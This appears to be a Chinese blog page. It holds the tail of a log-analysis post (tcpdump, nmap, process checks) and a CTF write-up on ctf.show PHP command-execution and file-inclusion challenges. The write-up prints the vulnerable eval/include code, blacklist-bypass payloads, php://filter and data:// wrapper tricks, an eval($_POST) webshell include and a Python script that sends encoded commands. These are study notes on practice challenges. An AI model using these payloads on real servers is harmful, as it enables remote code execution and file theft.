<li><code>tcpdump -i eth0 -nnv ip </code></li>
<li><code>tcpdump -i eth0 -nnv vrrp </code></li>
</ol>
<p><strong>多条件抓包</strong></p>
<p>使用<code>and</code>，<code>or</code>，<code>not</code>关系符连接</p>
<p><strong>测试！</strong></p>
<p>云服务器上使用命令（注意and 和not 的使用！）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 src -nnc host xxx.xxx.xxx.xxx and not port 22  </span><br></pre></td></tr></table></figure>

<p>攻击机使用nmap进行扫描</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -O xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20211110230733644.png" alt="image-20211110230733644"></p>
<p>开始无内容（为什么排除22端口，因为不排除的话全篇都是ssh连接进行的交互数据），当攻击机执行nmap扫描命令后</p>
<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20211110230830396.png" alt="image-20211110230830396"></p>
<p>开始有显示</p>
<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20211110231012473.png" alt="image-20211110231012473"></p>
<p>kali的nmap扫描结果如上</p>
<h2 id="可疑进程检测"><a href="#可疑进程检测" class="headerlink" title="可疑进程检测"></a>可疑进程检测</h2><p>查看进程命令</p>
<p><code>ps</code></p>
<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20211110232229061.png" alt="image-20211110232229061"></p>
<p><code>ps -anx | less</code></p>
<p>查看系统进程</p>
<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20211110234119692.png" alt="image-20211110234119692"></p>
<p>带中括号，这些进程不要kill</p>
<p><code>pstree</code></p>
<p>查看进程树</p>
<p><img src="/../images/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.assets/image-20211110232444821.png" alt="image-20211110232444821"></p>
<p>其中<code>pstree -p</code>可以显示带进程号的tree </p>
<p><code>top</code></p>
<p>该命令进行后，警惕将CPU占用率拉到很高的进程</p>
<p><code>netstat -anput</code></p>
<p><code>ss -an | grep tcp</code></p>
<p>查看各个端口的连接情况</p>
<p><code>ss -an | grep &quot;:22&quot;</code></p>
<p>查看22端口是否有他人连接</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof /usr/sbin/vsftpd</span><br></pre></td></tr></table></figure>

<p>查看某个文件被哪个进程所使用</p>

    

    

    

  </div>
  <div class="article-info article-info-index">
    
    
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Log Audit</a>
        		</li>
      		
		</ul>
	</div>

    

    
    <p class="article-more-link">
      <a class="article-more-a" href="/2023/11/22/%E5%86%85%E7%BD%91%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">展开全文 >></a>
    </p>
    

    
    <div class="clearfix"></div>
  </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-CTF-web-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
  
  
    <h1 itemprop="name">
	
	  <a class="article-title" href="/2023/11/22/CTF-web-2/" target="_blank">CTF-web-2</a>
  
    </h1>
  


  
  
<a href="/2023/11/22/CTF-web-2/" class="archive-article-date">
        <time datetime="2023-11-21T17:36:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-11-22</time>
</a>

  
  
    

  
  </header>
  
  <div class="article-entry" itemprop="articleBody">
    
    <center>
    CTF-web学习(补档)
</center>

<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>发现29的Payload也可以用，但是法二的解法需要变动一下，因为过滤了php，所以无法新启一个Php代码块儿</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo &quot;&quot;;include($_GET[&#x27;shell&#x27;]);?&gt;&amp;shell=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>闭合echo ‘’;后添加include文件包含，使用伪协议读取</p>
<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>可以看出多过滤了<code>cat</code> ,<code>shell</code>,<code>\&#39;</code>和空格等符号，所以上述解法1是不能使用了，对法二进行构造</p>
<h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p><code>echo%09&quot;&quot;;include($_GET[&quot;cmd&quot;]);?&gt;&amp;cmd=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p><strong>注意</strong>：上述空格使用%09编码绕过，且单引号全部换成双引号。</p>
<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p><strong>空格绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt; &lt;&gt; 重定向符</span><br><span class="line">%09(需要php环境)</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$9</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></figure>

<p><strong>文件内容显示</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br></pre></td></tr></table></figure>

<p>闭合c的绕过限制</p>
<p>payload：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[&quot;cmd&quot;]);&amp;cmd=system(&quot;tac f*&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/../images/CTF-web-2.assets/image-20211112105305243.png" alt="image-20211112105305243"></p>
<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>过滤更多了，括号和<code>echo</code>还有分号都给过滤了，考虑如下进行绕过括号</p>
<p><img src="D:\Myblog\source\images\CTF-web-2.assets\1999159-20201002223158950-1419102854.png" alt="img"></p>
<p>同时注意，&#x3D;&#x3D;php代码的最后一句是可以不带分号的！&#x3D;&#x3D;</p>
<p>且实际测试中发现对%09的过滤更加严格了，参考php语言，换用%0a（&#x3D;&#x3D;换行符&#x3D;&#x3D;）进行绕过空格</p>
<h4 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>尝试一下用Post传参</p>
<p><img src="/../images/CTF-web-2.assets/image-20211112111952483.png" alt="image-20211112111952483"></p>
<p>一样可以</p>
<h3 id="web33、34、35、36"><a href="#web33、34、35、36" class="headerlink" title="web33、34、35、36"></a>web33、34、35、36</h3><p>均可用，其中36过滤数字，可替换成不加引号的字符，因为php向下兼容，这种写法被保留下来</p>
<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>文件包含了，但过滤了get传参的flag字符，如果直接使用filter的伪协议的话，会因为包含flag.php而无法成功，所以转而考虑data伪协议</p>
<blockquote>
<p>php 5.2.0 起，数据流封装器开始有效，主要用于数据流的读取，如果传入的数据是PHP代码就会执行代码。使用方法为:</p>
</blockquote>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,xxxx(base64编码后的数据)</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<p>shell通配符绕过flag，tac反序输出内容，方便起见直接传了php代码</p>
<h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><p>多过滤了一个php的字符，上述方法仍适用，将后续的php代码使用base64编码进行绕过即可</p>
<p>payload1:</p>
<p><code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZioiKTs/Pg==</code></p>
<p>使用短标签绕过</p>
<p>payload2:</p>
<p><code>?c=data://text/plain,&lt;?=system(&quot;tac f*&quot;);?&gt;</code></p>
<h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会强制将传参内容加上.php的后缀，但是如果我们输入测试</p>
<p><code>?c=data://text/plain,&lt;?=phpinfo();?&gt;</code></p>
<p>发现会有回显并且最后会输出<code>1.php</code>，因为执行了前部分Php代码成功，返回值为1，因此加上了1.php，解法同上即可</p>
<h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<p>官方Hint_1</p>
<p><code>show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p>
<p>官方Hint_2</p>
<p>还可以通过</p>
<p><code>?c=session_start();system(session_id());</code></p>
<p>并将PHPSESSID传入命令进行命令执行，可以发现有返回目录</p>
<p><img src="/../images/CTF-web-2.assets/image-20211121184944660.png" alt="image-20211121184944660"></p>
<p><img src="/../images/CTF-web-2.assets/image-20211121185106046.png" alt="image-20211121185106046"></p>
<p>但是似乎无法获取flag的内容</p>
<h4 id="法一-2"><a href="#法一-2" class="headerlink" title="法一"></a>法一</h4><p><strong>思路：</strong></p>
<p>首先试着打印一下当前能够使用的所有变量</p>
<p><code>?c=print_r(get_defined_vars())</code></p>
<p><img src="/../images/CTF-web-2.assets/image-20211121185654907.png" alt="image-20211121185654907"></p>
<p>我们发现，所有变量都是数据结构同时POST还暂时为空，我们考虑传入一个POST参数，其值为phpinfo，并弹出这个数据的内容进行命令执行</p>
<p><img src="/../images/CTF-web-2.assets/image-20211121190918416.png" alt="image-20211121190918416"></p>
<p><img src="/../images/CTF-web-2.assets/image-20211121190926485.png" alt="image-20211121190926485"></p>
<p>payload:<code>?c=eval(array_pop(next(get_defined_vars())));</code></p>
<p>POST:<code>1=phpinfo();</code></p>
<p><img src="/../images/CTF-web-2.assets/image-20211121192418535.png" alt="image-20211121192418535"></p>
<p>接下来改变1的赋值即可读出flag</p>
<p><img src="/../images/CTF-web-2.assets/image-20211121192552798.png" alt="image-20211121192552798"></p>
<h4 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13778333.html">无参数文件读取</a></p>
</blockquote>
<p>scandir(current(localeconv())) 查看当前目录所有文件名</p>
<p>我们可以发现flag.php在数组的倒数第二个值里，我们可以通过 array_reverse 进行逆转数组，然后用next()函数进行下一个值的读取，即可成功读取flag.php文件</p>
<p>payload:<code>?c=highlight_flie(next(array_reverse(scandir(current(localeconv())))));</code></p>
<h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，并没有过滤掉<code>%、|</code>等符号，因此，首先是通过或运算，拼凑出所有可用 的命令，同时通过Php语言的一些风格，如<code>(&quot;system&quot;)(&quot;ls&quot;)</code>也能够执行，来绕过空格的限制		</p>
<p>如图</p>
<p><img src="/../images/CTF-web-2.assets/image-20211121213402493.png" alt="image-20211121213402493"></p>
<p>POST传参，c为两个按位取或运算，羽师傅脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">r&quot;php D:\enviroment\phpstudy_pro\WWW\rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="web42-1"><a href="#web42-1" class="headerlink" title="web42"></a>web42</h3><p>简单的截断<code> &gt;/dev/null 2&gt;&amp;1</code></p>
<p>该命令会将所有结果扔到null里，即不回显</p>
<p>payload:<code>?c=tac fla*.php;ls</code></p>
<h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><p>过滤了分号，可以用url编码<code>&amp;&amp;</code>代替分号的功能</p>
<p>两个语句都执行，只不过第二个返回入Null里了，后面也可以使用<code>%0a</code>换行符使得语句入第二行无效</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">grep</span><br><span class="line">strings</span><br></pre></td></tr></table></figure>

<h3 id="web44-45-46-47"><a href="#web44-45-46-47" class="headerlink" title="web44,45,46,47"></a>web44,45,46,47</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13279815.html">一些绕过技巧</a></p>
<p>待续……</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p><code>php://filter/convert.base64-encode/source=flag.php</code></p>
<p>伪协议</p>
<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>本意是想通过</p>
<p><code>?file=data://test/plain;base64,xxxx</code>直接读取，但是发现，这里好像还是会被过滤检测，<del>不能理解</del>，已解决，原因是并未在前台显示，右键查看源码即可出来</p>
<p>只能使用官方的绕过</p>
<p>payload:<code>?file=data://text/plain,&lt;?=eval($_POST[1]);?&gt;</code></p>
